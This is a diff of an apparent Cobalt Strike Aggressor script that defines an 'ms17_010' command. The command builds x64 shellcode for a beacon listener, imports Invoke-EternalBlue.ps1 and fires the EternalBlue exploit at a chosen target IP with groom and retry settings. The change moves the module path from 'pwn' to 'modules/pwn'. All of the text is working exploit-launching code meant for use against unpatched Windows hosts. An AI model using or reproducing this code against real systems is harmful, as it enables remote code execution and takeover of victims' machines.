@@ -1,7 +1,7 @@
 sub ms17_010 {
 	$listener = $3['listener'];
 	$stager = transform(shellcode($listener, false, "x64"),"array");
-	bpowershell_import!($bid, getFileProper(script_resource("pwn"), "Invoke-EternalBlue.ps1"));
+	bpowershell_import!($bid, getFileProper(script_resource("modules/pwn"), "Invoke-EternalBlue.ps1"));
     bpowerpick($bid, 'Invoke-EternalBlue -Target '.$3['ip'].' -Shellcode @('.$stager.') -InitialGrooms '.$3['grooms'].' -MaxAttempts '.$3['max_attempts']);
 }
 
